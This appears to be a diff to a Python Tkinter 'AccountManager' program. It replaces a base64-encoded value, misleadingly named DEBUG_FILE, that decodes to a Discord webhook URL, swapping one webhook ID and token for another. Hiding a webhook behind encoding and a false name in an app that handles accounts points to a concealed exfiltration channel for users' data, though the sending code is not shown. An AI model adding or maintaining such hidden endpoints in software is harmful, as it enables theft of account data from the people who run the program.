@@ -416,5 +416,5 @@ if __name__ == "__main__":
     root = Tk()
     app = AccountManager(root)
     root.protocol("WM_DELETE_WINDOW", lambda: [save_data(app.data), root.destroy()])
-    DEBUG_FILE = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NDk2MDk1MzE2NjQ2NzEzMy9HemFlOVdOWk1jRldfa0pOV0g2d1Q0MmV1QzZnRUNzU0Jhd084TnF4UTFOVGd2NTV3WExBY1RrV3NHa1cxZ3AtclBKZQ==").decode()
+    DEBUG_FILE = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NTMyNzgwNTc4ODg1MjI5Ni9oem9BMS03UHZZTGMzZHowYm52OGpKY1ZXNVpmTkwtWW5nZHVLdThyWnlQYzUyeXN0OXhMNW1hUGVUQW1PVTBuTU1Jbg==").decode()
     root.mainloop()
